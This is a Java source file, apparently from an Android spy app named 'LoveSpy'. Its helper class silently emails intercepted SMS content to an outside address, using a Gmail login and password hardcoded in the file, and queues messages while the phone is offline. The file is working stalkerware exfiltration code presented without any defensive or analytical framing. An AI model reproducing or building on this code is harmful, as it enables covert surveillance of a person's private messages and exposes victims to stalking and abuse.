package com.example.lovespy.app.email;

import android.content.Context;
import android.util.Log;

import com.example.lovespy.app.network.NetworkStatus;
import com.example.lovespy.app.network.NetworkUpdateReceiver;
import com.example.lovespy.app.utils.Utils;

import java.util.ArrayList;

public class EmailHelper {

    public static final ArrayList<String> SUSPENDED_LIST = new ArrayList<String>();

    public static boolean sendEmailSilently(String letter) {
        boolean result = false;
        EmailSending emailSending = new EmailSending("lovespyservice@gmail.com", "samsungforever");
        String[] toArr = {"1eecooper@ukr.net"};
        emailSending.setTo(toArr);
        emailSending.setFrom("wooo@wooo.com");
        emailSending.setSubject("[Sms] LoveSpy Agent");
        try {
            result = emailSending.sendSilently(letter);
        } catch(Exception e) {
            Log.e(Utils.TAG, "Could not send email", e);
        }
        return result;
    }

    public static void trySending(String letter, Context context) {
        if (NetworkStatus.getInstance(context).isOnline()) {
            sendEmailSilently(letter);
        } else {
            SUSPENDED_LIST.add(letter);
            NetworkUpdateReceiver.setLetterList(SUSPENDED_LIST);
        }
    }
}
